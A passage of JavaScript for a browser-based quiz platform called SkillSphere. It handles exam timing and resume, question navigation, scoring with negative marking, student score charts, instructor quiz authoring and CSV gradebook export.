  if (!pendingQuizToStart) return;

  const quiz = pendingQuizToStart;
  const questions = QUESTION_DATABASE[quiz.id] || QUESTION_DATABASE['c-prog'];

  appState.currentExam = {
    quiz: quiz,
    questions: questions,
    currentIndex: 0,
    answers: {},
    markedReview: {},
    remainingSeconds: quiz.durationMinutes * 60,
    totalSeconds: quiz.durationMinutes * 60,
    timerIntervalId: null,
    startedAt: new Date().toISOString()
  };

  saveActiveExamToStorage();
  startExamView();
}

function startExamView() {
  navigateTo('exam');
  
  document.getElementById('exam-quiz-title').innerText = appState.currentExam.quiz.title;
  document.getElementById('exam-subject-badge').innerText = appState.currentExam.quiz.subject;
  document.getElementById('exam-negative-badge').innerText = appState.currentExam.quiz.negativeMarkingEnabled
    ? `Negative Marking: -${appState.currentExam.quiz.negativeMarks}`
    : `Negative Marking: Off`;

  startCountdownTimer();
  renderCurrentQuestion();
  renderPalette();
  updatePaletteSummary();
  showToast(`Exam Started! Remaining time: ${Math.floor(appState.currentExam.remainingSeconds / 60)} minutes.`, 'info');
}

// =============================================================================
// 7. COUNTDOWN TIMER & PERSISTENCE
// =============================================================================
function startCountdownTimer() {
  if (appState.currentExam.timerIntervalId) {
    clearInterval(appState.currentExam.timerIntervalId);
  }

  updateTimerDisplay();

  appState.currentExam.timerIntervalId = setInterval(() => {
    appState.currentExam.remainingSeconds--;

    saveActiveExamToStorage();
    updateTimerDisplay();

    const displayEl = document.getElementById('exam-timer-display');
    if (appState.currentExam.remainingSeconds <= 120 && displayEl) {
      displayEl.classList.add('text-amber-400');
    }
    if (appState.currentExam.remainingSeconds <= 30 && displayEl) {
      displayEl.classList.remove('text-amber-400');
      displayEl.classList.add('text-rose-500');
    }

    if (appState.currentExam.remainingSeconds <= 0) {
      clearInterval(appState.currentExam.timerIntervalId);
      showToast('Time expired! Auto-submitting assessment...', 'warning');
      finalizeAndScoreQuiz(true);
    }
  }, 1000);
}

function updateTimerDisplay() {
  const displayEl = document.getElementById('exam-timer-display');
  if (!displayEl) return;

  const seconds = Math.max(0, appState.currentExam.remainingSeconds);
  const m = Math.floor(seconds / 60).toString().padStart(2, '0');
  const s = (seconds % 60).toString().padStart(2, '0');
  displayEl.innerText = `${m}:${s}`;
}

function saveActiveExamToStorage() {
  if (!appState.currentExam.quiz) return;
  const payload = {
    quiz: appState.currentExam.quiz,
    currentIndex: appState.currentExam.currentIndex,
    answers: appState.currentExam.answers,
    markedReview: appState.currentExam.markedReview,
    remainingSeconds: appState.currentExam.remainingSeconds,
    totalSeconds: appState.currentExam.totalSeconds,
    startedAt: appState.currentExam.startedAt
  };
  localStorage.setItem('skillsphere_active_exam', JSON.stringify(payload));
}

function checkAndRestoreActiveExam() {
  const saved = localStorage.getItem('skillsphere_active_exam');
  if (!saved) return;

  try {
    const parsed = JSON.parse(saved);
    if (parsed && parsed.quiz && parsed.remainingSeconds > 5) {
      const confirmResume = confirm(`SkillSphere detected an unfinished assessment: "${parsed.quiz.title}". Would you like to resume your session with saved answers intact?`);
      if (confirmResume) {
        const questions = QUESTION_DATABASE[parsed.quiz.id] || QUESTION_DATABASE['c-prog'];
        appState.currentExam = {
          quiz: parsed.quiz,
          questions: questions,
          currentIndex: parsed.currentIndex || 0,
          answers: parsed.answers || {},
          markedReview: parsed.markedReview || {},
          remainingSeconds: parsed.remainingSeconds,
          totalSeconds: parsed.totalSeconds,
          timerIntervalId: null,
          startedAt: parsed.startedAt
        };
        startExamView();
      } else {
        localStorage.removeItem('skillsphere_active_exam');
      }
    } else {
      localStorage.removeItem('skillsphere_active_exam');
    }
  } catch (err) {
    console.error("Failed to restore exam", err);
    localStorage.removeItem('skillsphere_active_exam');
  }
}

// =============================================================================
// 8. QUESTION RENDERING & PALETTE
// =============================================================================
function renderCurrentQuestion() {
  const exam = appState.currentExam;
  const q = exam.questions[exam.currentIndex];
  if (!q) return;

  document.getElementById('exam-question-num-pill').innerText = `Question ${exam.currentIndex + 1} of ${exam.questions.length}`;
  document.getElementById('exam-question-marks-badge').innerText = `+${q.marks} Marks / -${exam.quiz.negativeMarkingEnabled ? q.negative : 0} Negative`;
  document.getElementById('exam-question-text').innerText = q.question;

  const codeBlock = document.getElementById('exam-code-snippet');
  if (q.code) {
    codeBlock.classList.remove('hidden');
    codeBlock.querySelector('code').innerText = q.code;
  } else {
    codeBlock.classList.add('hidden');
  }

  const optionsContainer = document.getElementById('exam-options-container');
  const letters = ['A', 'B', 'C', 'D', 'E', 'F'];
  const selectedChoice = exam.answers[exam.currentIndex];

  optionsContainer.innerHTML = q.options.map((optionText, idx) => {
    const isSelected = selectedChoice === idx;
    return `
      <div onclick="selectOption(${idx})" class="exam-option-card ${isSelected ? 'selected' : ''}">
        <div class="flex items-center">
          <div class="option-indicator">${letters[idx]}</div>
          <span class="text-xs sm:text-sm font-medium text-slate-800">${escapeHtml(optionText)}</span>
        </div>
        ${isSelected ? '<i data-lucide="check-circle" class="w-4 h-4 text-royal-600"></i>' : ''}
      </div>
    `;
  }).join('');

  const isMarked = !!exam.markedReview[exam.currentIndex];
  const btnMark = document.getElementById('btn-mark-review');
  const markLabel = document.getElementById('mark-review-label');
  if (isMarked) {
    btnMark.classList.add('bg-amber-100', 'border-amber-300', 'text-amber-800');
    markLabel.innerText = 'Marked for Review';
  } else {
    btnMark.classList.remove('bg-amber-100', 'border-amber-300', 'text-amber-800');
    markLabel.innerText = 'Mark for Review';
  }

  const btnPrev = document.getElementById('btn-prev-q');
  if (exam.currentIndex === 0) {
    btnPrev.setAttribute('disabled', 'true');
    btnPrev.classList.add('opacity-40', 'cursor-not-allowed');
  } else {
    btnPrev.removeAttribute('disabled');
    btnPrev.classList.remove('opacity-40', 'cursor-not-allowed');
  }

  const btnNext = document.getElementById('btn-next-q');
  if (exam.currentIndex === exam.questions.length - 1) {
    btnNext.innerHTML = `<span>Submit</span> <i data-lucide="check" class="w-3.5 h-3.5"></i>`;
  } else {
    btnNext.innerHTML = `<span>Next</span> <i data-lucide="chevron-right" class="w-3.5 h-3.5"></i>`;
  }

  initLucideIcons();
}

function selectOption(optionIndex) {
  appState.currentExam.answers[appState.currentExam.currentIndex] = optionIndex;
  saveActiveExamToStorage();
  renderCurrentQuestion();
  renderPalette();
  updatePaletteSummary();
}

function clearCurrentAnswer() {
  delete appState.currentExam.answers[appState.currentExam.currentIndex];
  saveActiveExamToStorage();
  renderCurrentQuestion();
  renderPalette();
  updatePaletteSummary();
  showToast('Response cleared.', 'info');
}

function toggleMarkForReview() {
  const idx = appState.currentExam.currentIndex;
  appState.currentExam.markedReview[idx] = !appState.currentExam.markedReview[idx];
  saveActiveExamToStorage();
  renderCurrentQuestion();
  renderPalette();
  updatePaletteSummary();
}

function navigateQuestion(direction) {
  const exam = appState.currentExam;
  const newIndex = exam.currentIndex + direction;

  if (newIndex >= 0 && newIndex < exam.questions.length) {
    exam.currentIndex = newIndex;
    renderCurrentQuestion();
    renderPalette();
  } else if (newIndex >= exam.questions.length) {
    promptSubmitConfirmation();
  }
}

function jumpToQuestion(index) {
  appState.currentExam.currentIndex = index;
  renderCurrentQuestion();
  renderPalette();
}

function renderPalette() {
  const palette = document.getElementById('exam-palette-grid');
  if (!palette) return;

  const exam = appState.currentExam;
  palette.innerHTML = exam.questions.map((_, idx) => {
    const isCurrent = exam.currentIndex === idx;
    const isAnswered = exam.answers[idx] !== undefined;
    const isReview = !!exam.markedReview[idx];

    let stateClass = 'unanswered';
    if (isReview) {
      stateClass = 'review';
    } else if (isAnswered) {
      stateClass = 'answered';
    }

    return `
      <button onclick="jumpToQuestion(${idx})" class="palette-btn ${stateClass} ${isCurrent ? 'current' : ''}">
        ${idx + 1}
      </button>
    `;
  }).join('');
}

function updatePaletteSummary() {
  const exam = appState.currentExam;
  const total = exam.questions.length;
  const answeredCount = Object.keys(exam.answers).length;
  const reviewCount = Object.keys(exam.markedReview).filter(k => exam.markedReview[k]).length;
  const unansweredCount = total - answeredCount;

  document.getElementById('summary-answered-count').innerText = answeredCount;
  document.getElementById('summary-review-count').innerText = reviewCount;
  document.getElementById('summary-unanswered-count').innerText = unansweredCount;
}

// =============================================================================
// 9. SCORING & FINAL RESULTS
// =============================================================================
function promptSubmitConfirmation() {
  const exam = appState.currentExam;
  const answered = Object.keys(exam.answers).length;
  const review = Object.keys(exam.markedReview).filter(k => exam.markedReview[k]).length;
  const unanswered = exam.questions.length - answered;

  document.getElementById('confirm-answered').innerText = answered;
  document.getElementById('confirm-review').innerText = review;
  document.getElementById('confirm-unanswered').innerText = unanswered;

  openModal('modal-submit-confirm');
}

async function finalizeAndScoreQuiz(isAutoSubmit = false) {
  closeModal('modal-submit-confirm');

  if (appState.currentExam.timerIntervalId) {
    clearInterval(appState.currentExam.timerIntervalId);
  }

  const exam = appState.currentExam;
  const quiz = exam.quiz;
  const questions = exam.questions;

  let obtainedMarks = 0;
  let totalMarks = 0;
  let correctCount = 0;
  let incorrectCount = 0;
  let unansweredCount = 0;
  let reviewDetails = [];

  questions.forEach((q, idx) => {
    totalMarks += q.marks;
    const studentChoice = exam.answers[idx];

    if (studentChoice === undefined) {
      unansweredCount++;
      reviewDetails.push({
        qIndex: idx,
        question: q.question,
        options: q.options,
        studentChoice: null,
        correctChoice: q.correct,
        isCorrect: false,
        isUnanswered: true,
        marksDelta: 0,
        explanation: q.explanation,
        code: q.code
      });
    } else if (studentChoice === q.correct) {
      correctCount++;
      obtainedMarks += q.marks;
      reviewDetails.push({
        qIndex: idx,
        question: q.question,
        options: q.options,
        studentChoice: studentChoice,
        correctChoice: q.correct,
        isCorrect: true,
        isUnanswered: false,
        marksDelta: q.marks,
        explanation: q.explanation,
        code: q.code
      });
    } else {
      incorrectCount++;
      const deduction = quiz.negativeMarkingEnabled ? q.negative : 0;
      obtainedMarks -= deduction;
      reviewDetails.push({
        qIndex: idx,
        question: q.question,
        options: q.options,
        studentChoice: studentChoice,
        correctChoice: q.correct,
        isCorrect: false,
        isUnanswered: false,
        marksDelta: -deduction,
        explanation: q.explanation,
        code: q.code
      });
    }
  });

  obtainedMarks = Math.max(0, parseFloat(obtainedMarks.toFixed(2)));
  const percentage = parseFloat(((obtainedMarks / totalMarks) * 100).toFixed(1));
  const isPassed = percentage >= quiz.passingPercentage;
  const timeTakenSeconds = exam.totalSeconds - exam.remainingSeconds;
  const candidateName = localStorage.getItem('skillsphere_student_name') || "Alex Rivera";

  const resultRecord = {
    id: `att_${Date.now()}`,
    quizId: quiz.id,
    quizTitle: quiz.title,
    subject: quiz.subject,
    obtainedMarks: obtainedMarks,
    totalMarks: totalMarks,
    percentage: percentage,
    correctCount: correctCount,
    incorrectCount: incorrectCount,
    unansweredCount: unansweredCount,
    timeTakenSeconds: timeTakenSeconds,
    isPassed: isPassed,
    date: new Date().toISOString().split('T')[0],
    reviewDetails: reviewDetails
  };

  // Local Storage
  appState.attempts.unshift(resultRecord);
  localStorage.setItem('skillsphere_attempts', JSON.stringify(appState.attempts));

  // Roster Entry
  appState.roster.unshift({
    name: candidateName,
    studentId: "CS-2024-0418",
    quizTitle: quiz.title,
    score: `${obtainedMarks} / ${totalMarks}`,
    pct: percentage,
    time: formatTimeSeconds(timeTakenSeconds),
    date: "Just now",
    passed: isPassed
  });
  localStorage.setItem('skillsphere_roster', JSON.stringify(appState.roster));

  // Sync to Firebase if connected
  if (typeof window.fbSaveQuizAttempt === 'function') {
    window.fbSaveQuizAttempt({
      quizId: quiz.id,
      quizTitle: quiz.title,
      subject: quiz.subject,
      obtainedMarks: obtainedMarks,
      totalMarks: totalMarks,
      percentage: percentage,
      isPassed: isPassed,
      correctCount: correctCount,
      incorrectCount: incorrectCount,
      unansweredCount: unansweredCount,
      timeTakenSeconds: timeTakenSeconds,
      candidateName: candidateName
    });
  }

  localStorage.removeItem('skillsphere_active_exam');
  appState.lastResult = resultRecord;

  renderResultsView(resultRecord);
  showToast(isAutoSubmit ? 'Time expired. Assessment scored.' : 'Assessment submitted and scored successfully!', 'success');
}

function renderResultsView(res) {
  navigateTo('results');

  const badge = document.getElementById('res-pass-badge');
  if (res.isPassed) {
    badge.className = 'inline-flex items-center gap-1.5 px-3.5 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider mb-4 bg-emerald-500/20 text-emerald-300 border border-emerald-400/30';
    badge.innerHTML = `<i data-lucide="check-circle" class="w-4 h-4"></i> PASSED (Cutoff Met)`;
  } else {
    badge.className = 'inline-flex items-center gap-1.5 px-3.5 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider mb-4 bg-rose-500/20 text-rose-300 border border-rose-400/30';
    badge.innerHTML = `<i data-lucide="x-circle" class="w-4 h-4"></i> FAILED (Needs Improvement)`;
  }

  document.getElementById('res-quiz-title').innerText = res.quizTitle;
  document.getElementById('res-timestamp').innerText = `Completed on ${new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}`;
  document.getElementById('res-score-percent').innerText = `${res.percentage}%`;
  document.getElementById('res-marks-ratio').innerText = `Obtained ${res.obtainedMarks} / ${res.totalMarks} Marks`;

  document.getElementById('res-correct-count').innerText = res.correctCount;
  document.getElementById('res-incorrect-count').innerText = res.incorrectCount;
  document.getElementById('res-unanswered-count').innerText = res.unansweredCount;
  document.getElementById('res-time-taken').innerText = formatTimeSeconds(res.timeTakenSeconds);

  renderReviewList('all');
  initLucideIcons();
}

function renderReviewList(filterType = 'all') {
  const container = document.getElementById('results-review-container');
  if (!container || !appState.lastResult) return;

  const details = appState.lastResult.reviewDetails;
  const filtered = details.filter(item => {
    if (filterType === 'correct') return item.isCorrect;
    if (filterType === 'incorrect') return !item.isCorrect && !item.isUnanswered;
    return true;
  });

  const letters = ['A', 'B', 'C', 'D'];

  container.innerHTML = filtered.map((item, idx) => {
    let statusBanner = '';
    let cardBorder = 'border-slate-200';

    if (item.isCorrect) {
      cardBorder = 'border-emerald-200 bg-emerald-50/20';
      statusBanner = `<span class="bg-emerald-100 text-emerald-800 text-xs font-bold px-2 py-0.5 rounded-lg flex items-center gap-1"><i data-lucide="check" class="w-3.5 h-3.5"></i> Correct (+${item.marksDelta})</span>`;
    } else if (item.isUnanswered) {
      cardBorder = 'border-slate-300 bg-slate-50/40';
      statusBanner = `<span class="bg-slate-200 text-slate-700 text-xs font-bold px-2 py-0.5 rounded-lg">Unanswered (0.0)</span>`;
    } else {
      cardBorder = 'border-rose-200 bg-rose-50/20';
      statusBanner = `<span class="bg-rose-100 text-rose-800 text-xs font-bold px-2 py-0.5 rounded-lg flex items-center gap-1"><i data-lucide="x" class="w-3.5 h-3.5"></i> Incorrect (${item.marksDelta})</span>`;
    }

    return `
      <div class="rounded-2xl border ${cardBorder} p-4 sm:p-5 space-y-3.5">
        <div class="flex items-center justify-between pb-2 border-b border-slate-100">
          <span class="text-xs font-bold uppercase text-slate-500">Question ${item.qIndex + 1}</span>
          ${statusBanner}
        </div>

        <h4 class="text-sm font-semibold text-slate-900 leading-snug">
          ${escapeHtml(item.question)}
        </h4>

        ${item.code ? `
          <div class="bg-slate-900 text-slate-100 p-3 rounded-xl font-mono text-xs overflow-x-auto">
            <code>${escapeHtml(item.code)}</code>
          </div>
        ` : ''}

        <div class="space-y-2 text-xs">
          ${item.options.map((opt, oIdx) => {
            let optStyle = 'border-slate-200 bg-white text-slate-700';
            let icon = '';

            if (oIdx === item.correctChoice) {
              optStyle = 'border-emerald-500 bg-emerald-50 text-emerald-900 font-bold';
              icon = '<span class="text-emerald-600 font-bold ml-auto flex items-center gap-1"><i data-lucide="check" class="w-3.5 h-3.5"></i> Correct Key</span>';
            } else if (oIdx === item.studentChoice && !item.isCorrect) {
              optStyle = 'border-rose-500 bg-rose-50 text-rose-900 font-bold line-through';
              icon = '<span class="text-rose-600 font-bold ml-auto flex items-center gap-1"><i data-lucide="x" class="w-3.5 h-3.5"></i> Your Choice</span>';
            }

            return `
              <div class="p-2.5 rounded-xl border ${optStyle} flex items-center gap-2">
                <span class="w-5 h-5 rounded-md flex items-center justify-center font-bold text-[10px] bg-slate-100 border border-slate-300">${letters[oIdx]}</span>
                <span>${escapeHtml(opt)}</span>
                ${icon}
              </div>
            `;
          }).join('')}
        </div>

        <div class="p-3 bg-royal-50/80 border border-royal-100 rounded-xl text-xs text-royal-950 space-y-1">
          <div class="font-bold flex items-center gap-1 text-royal-800">
            <i data-lucide="info" class="w-3.5 h-3.5"></i> Technical Explanation:
          </div>
          <p class="leading-relaxed text-slate-700">${escapeHtml(item.explanation)}</p>
        </div>
      </div>
    `;
  }).join('');

  initLucideIcons();
}

function filterReviewQuestions(type, btnEl) {
  document.querySelectorAll('.review-filter-btn').forEach(btn => btn.classList.remove('active'));
  if (btnEl) btnEl.classList.add('active');
  renderReviewList(type);
}

function retakeCurrentQuiz() {
  if (appState.lastResult && appState.lastResult.quizId) {
    openInstructionsModal(appState.lastResult.quizId);
  } else {
    openInstructionsModal('c-prog');
  }
}

// =============================================================================
// 10. STUDENT DASHBOARD
// =============================================================================
function renderStudentDashboard() {
  const attempts = appState.attempts;
  const totalAttempts = attempts.length;
  let avgScore = 0;
  let highestScore = 0;

  if (totalAttempts > 0) {
    const sum = attempts.reduce((acc, curr) => acc + curr.percentage, 0);
    avgScore = parseFloat((sum / totalAttempts).toFixed(1));
    highestScore = Math.max(...attempts.map(a => a.percentage));
  }

  document.getElementById('stat-total-attempts').innerText = totalAttempts;
  document.getElementById('stat-avg-score').innerText = `${avgScore}%`;
  document.getElementById('stat-highest-score').innerText = `${highestScore}%`;
  document.getElementById('stat-completion-rate').innerText = '100%';

  const tbody = document.getElementById('student-attempts-table');
  if (tbody) {
    if (attempts.length === 0) {
      tbody.innerHTML = `<tr><td colspan="7" class="py-8 text-center text-slate-400 text-xs">No assessments attempted yet. Select a quiz above to start your first test!</td></tr>`;
    } else {
      tbody.innerHTML = attempts.map(att => `
        <tr class="hover:bg-slate-50/60 transition-colors">
          <td class="py-3 px-4 sm:px-6 font-semibold text-slate-900">${att.quizTitle}</td>
          <td class="py-3 px-4 text-slate-600">${att.subject}</td>
          <td class="py-3 px-4 font-mono font-medium">${att.obtainedMarks} / ${att.totalMarks}</td>
          <td class="py-3 px-4 font-bold ${att.isPassed ? 'text-emerald-600' : 'text-rose-600'}">${att.percentage}%</td>
          <td class="py-3 px-4">
            <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-bold ${att.isPassed ? 'bg-emerald-100 text-emerald-800' : 'bg-rose-100 text-rose-800'}">
              ${att.isPassed ? 'Passed' : 'Failed'}
            </span>
          </td>
          <td class="py-3 px-4 text-slate-500 text-xs">${att.date}</td>
          <td class="py-3 px-4 sm:px-6 text-right">
            <button onclick="openInstructionsModal('${att.quizId}')" class="text-xs font-semibold text-royal-600 hover:text-royal-800">
              Retake
            </button>
          </td>
        </tr>
      `).join('');
    }
  }

  renderScoreTrajectoryChart();
}

function renderScoreTrajectoryChart() {
  const canvas = document.getElementById('scoreChart');
  if (!canvas || !window.Chart) return;

  const reversed = [...appState.attempts].reverse();
  const labels = reversed.map((a, i) => `Test ${i + 1}: ${a.subject.substring(0, 8)}`);
  const dataPoints = reversed.map(a => a.percentage);

  if (appState.scoreChartInstance) {
    appState.scoreChartInstance.destroy();
  }

  const ctx = canvas.getContext('2d');
  appState.scoreChartInstance = new Chart(ctx, {
    type: 'line',
    data: {
      labels: labels.length ? labels : ['Mock Test 1', 'Mock Test 2', 'Mock Test 3'],
      datasets: [{
        label: 'Score Percentage (%)',
        data: dataPoints.length ? dataPoints : [75, 82, 90],
        borderColor: '#2563eb',
        backgroundColor: 'rgba(37, 99, 235, 0.08)',
        borderWidth: 2.5,
        tension: 0.35,
        fill: true,
        pointBackgroundColor: '#2563eb',
        pointRadius: 4,
        pointHoverRadius: 6
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: { display: false },
        tooltip: {
          backgroundColor: '#0a1426',
          padding: 8,
          titleFont: { size: 11, weight: 'bold' }
        }
      },
      scales: {
        y: {
          min: 0,
          max: 100,
          ticks: { callback: v => `${v}%`, font: { size: 10 } },
          grid: { color: '#f1f5f9' }
        },
        x: {
          ticks: { font: { size: 10 } },
          grid: { display: false }
        }
      }
    }
  });
}

function clearDemoAttemptHistory() {
  const confirmClear = confirm("Reset attempt history to initial sample records?");
  if (!confirmClear) return;

  localStorage.removeItem('skillsphere_attempts');
  localStorage.removeItem('skillsphere_active_exam');
  appState.attempts = [...DEFAULT_ATTEMPTS];
  localStorage.setItem('skillsphere_attempts', JSON.stringify(appState.attempts));

  renderStudentDashboard();
  showToast('Assessment history reset to baseline defaults.', 'info');
}

// =============================================================================
// 11. TEACHER CONSOLE & QUIZ AUTHORING
// =============================================================================
function renderInstructorView() {
  const quizzesTable = document.getElementById('instructor-quizzes-table');
  if (quizzesTable) {
    quizzesTable.innerHTML = appState.quizzes.map(q => `
      <tr class="hover:bg-slate-50 transition-colors">
        <td class="py-3 px-4 sm:px-6 font-semibold text-slate-900">${q.title}</td>
        <td class="py-3 px-4 text-slate-600">${q.subject}</td>
        <td class="py-3 px-4 text-slate-600">${q.durationMinutes} Mins</td>
        <td class="py-3 px-4 font-mono">${q.questionCount || 10}</td>
        <td class="py-3 px-4">
          <span class="text-xs font-semibold ${q.negativeMarkingEnabled ? 'text-amber-600' : 'text-slate-400'}">
            ${q.negativeMarkingEnabled ? `-${q.negativeMarks}` : 'Disabled'}
          </span>
        </td>
        <td class="py-3 px-4">
          <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800">
            Published
          </span>
        </td>
        <td class="py-3 px-4 sm:px-6 text-right">
          <button onclick="openInstructionsModal('${q.id}')" class="text-xs font-semibold text-royal-600 hover:text-royal-800 mr-2">
            Preview
          </button>
          <button onclick="deleteQuiz('${q.id}')" class="text-xs font-semibold text-rose-600 hover:text-rose-800">
            Delete
          </button>
        </td>
      </tr>
    `).join('');
  }

  renderRosterTable(appState.roster);
  const countEl = document.getElementById('inst-stat-quizzes');
  if (countEl) countEl.innerText = appState.quizzes.length;
}

function renderRosterTable(rosterData) {
  const tbody = document.getElementById('instructor-roster-table');
  if (!tbody) return;

  tbody.innerHTML = rosterData.map(r => `
    <tr class="hover:bg-slate-50 transition-colors">
      <td class="py-3 px-4 sm:px-6 font-medium text-slate-900">${r.name}</td>
      <td class="py-3 px-4 text-slate-500 font-mono text-xs">${r.studentId}</td>
      <td class="py-3 px-4 text-slate-700">${r.quizTitle}</td>
      <td class="py-3 px-4 font-mono font-medium">${r.score}</td>
      <td class="py-3 px-4 font-bold ${r.passed ? 'text-emerald-600' : 'text-rose-600'}">${r.pct}%</td>
      <td class="py-3 px-4 text-slate-500 text-xs">${r.time}</td>
      <td class="py-3 px-4 text-slate-500 text-xs">${r.date}</td>
      <td class="py-3 px-4 sm:px-6 text-right">
        <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-bold ${r.passed ? 'bg-emerald-100 text-emerald-800' : 'bg-rose-100 text-rose-800'}">
          ${r.passed ? 'PASSED' : 'FAILED'}
        </span>
      </td>
    </tr>
  `).join('');
}

function filterRoster(query) {
  const q = query.toLowerCase().trim();
  const filtered = appState.roster.filter(r => 
    r.name.toLowerCase().includes(q) || 
    r.studentId.toLowerCase().includes(q) || 
    r.quizTitle.toLowerCase().includes(q)
  );
  renderRosterTable(filtered);
}

function openCreateQuizModal() {
  openModal('modal-create-quiz');
}

function handleCreateQuizSubmit(e) {
  e.preventDefault();

  const title = document.getElementById('cq-title').value.trim();
  const subject = document.getElementById('cq-subject').value;
  const difficulty = document.getElementById('cq-difficulty').value;
  const duration = parseInt(document.getElementById('cq-duration').value) || 15;
  const passing = parseInt(document.getElementById('cq-passing').value) || 60;
  const negative = parseFloat(document.getElementById('cq-negative').value) || 0;
  const description = document.getElementById('cq-description').value.trim() || `Assessment for ${subject}.`;

  const quizId = `custom_${Date.now()}`;

  // Optional custom question builder
  const customQText = document.getElementById('cq-custom-qtext').value.trim();
  let questionsList = [];

  // Start with default subject questions if available
  const basePool = QUESTION_DATABASE[subject.toLowerCase().includes('python') ? 'python-prog' : subject.toLowerCase().includes('c prog') ? 'c-prog' : subject.toLowerCase().includes('java') ? 'js-core' : 'cybersec'] || QUESTION_DATABASE['c-prog'];
  questionsList = JSON.parse(JSON.stringify(basePool));

  if (customQText) {
    const opt0 = document.getElementById('cq-opt-0').value.trim() || "Option A";
    const opt1 = document.getElementById('cq-opt-1').value.trim() || "Option B";
    const opt2 = document.getElementById('cq-opt-2').value.trim() || "Option C";
    const opt3 = document.getElementById('cq-opt-3').value.trim() || "Option D";
    const correctIdx = parseInt(document.getElementById('cq-correct-choice').value) || 0;
    const explanation = document.getElementById('cq-explanation').value.trim() || "Correct answer configured by instructor.";

    const customQuestionObj = {
      id: `q_${Date.now()}`,
      question: customQText,
      options: [opt0, opt1, opt2, opt3],
      correct: correctIdx,
      marks: 2,
      negative: negative,
      explanation: explanation
    };

    // Prepend custom question to the front of the test
    questionsList.unshift(customQuestionObj);
  }

  // Register in QUESTION_DATABASE
  QUESTION_DATABASE[quizId] = questionsList;

  // Persist custom questions
  const savedCustom = localStorage.getItem('skillsphere_custom_questions') || '{}';
  const customMap = JSON.parse(savedCustom);
  customMap[quizId] = questionsList;
  localStorage.setItem('skillsphere_custom_questions', JSON.stringify(customMap));

  const newQuiz = {
    id: quizId,
    title: title,
    subject: subject,
    category: getCategoryForSubject(subject),
    difficulty: difficulty,
    durationMinutes: duration,
    totalMarks: questionsList.length * 2,
    passingPercentage: passing,
    negativeMarkingEnabled: negative > 0,
    negativeMarks: negative,
    description: description,
    questionCount: questionsList.length
  };

  appState.quizzes.unshift(newQuiz);
  localStorage.setItem('skillsphere_quizzes', JSON.stringify(appState.quizzes));

  closeModal('modal-create-quiz');
  document.getElementById('create-quiz-form').reset();

  renderCatalogGrid();
  renderInstructorView();
  showToast(`Quiz "${title}" published to student portal!`, 'success');
}

function deleteQuiz(quizId) {
  const confirmDelete = confirm("Are you sure you want to remove this assessment from the student catalog?");
  if (!confirmDelete) return;

  appState.quizzes = appState.quizzes.filter(q => q.id !== quizId);
  localStorage.setItem('skillsphere_quizzes', JSON.stringify(appState.quizzes));

  renderCatalogGrid();
  renderInstructorView();
  showToast("Assessment removed from catalog.", "info");
}

function getCategoryForSubject(subj) {
  if (subj.includes('Programming') || subj === 'C Programming') return 'Programming';
  if (subj.includes('HTML') || subj.includes('JavaScript') || subj.includes('CSS')) return 'Web Dev';
  return 'Systems & Security';
}

function exportQuizResultsCSV() {
  const roster = appState.roster;
  if (!roster.length) {
    showToast('No student attempts to export.', 'warning');
    return;
  }

  let csvContent = "data:text/csv;charset=utf-8,";
  csvContent += "Student Name,Student ID,Quiz Title,Score,Percentage,Time Taken,Date,Status\n";

  roster.forEach(r => {
    csvContent += `"${r.name}","${r.studentId}","${r.quizTitle}","${r.score}","${r.pct}%","${r.time}","${r.date}","${r.passed ? 'PASSED' : 'FAILED'}"\n`;
  });

  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `SkillSphere_Gradebook_${new Date().toISOString().split('T')[0]}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showToast('Roster gradebook exported to CSV!', 'success');
}

// =============================================================================
// 12. MODAL & TOAST HELPERS
// =============================================================================
function openModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    initLucideIcons();
  }
}

function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.add('hidden');
    modal.classList.remove('flex');
  }
}

function showToast(message, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;

  let iconName = 'info';
  if (type === 'success') iconName = 'check-circle';
  if (type === 'warning') iconName = 'alert-triangle';

  toast.innerHTML = `
    <i data-lucide="${iconName}" class="w-4 h-4 flex-shrink-0 ${type === 'success' ? 'text-emerald-500' : type === 'warning' ? 'text-amber-500' : 'text-royal-500'}"></i>
    <span class="text-slate-800">${escapeHtml(message)}</span>
  `;

  container.appendChild(toast);
  initLucideIcons();

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(8px)';
    toast.style.transition = 'all 0.25s ease';
    setTimeout(() => toast.remove(), 250);
  }, 4000);
}

function formatTimeSeconds(totalSecs) {
  const m = Math.floor(totalSecs / 60).toString().padStart(2, '0');
  const s = (totalSecs % 60).toString().padStart(2, '0');
  return `${m}:${s}`;
}

function escapeHtml(str) {
  if (!str) return '';
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
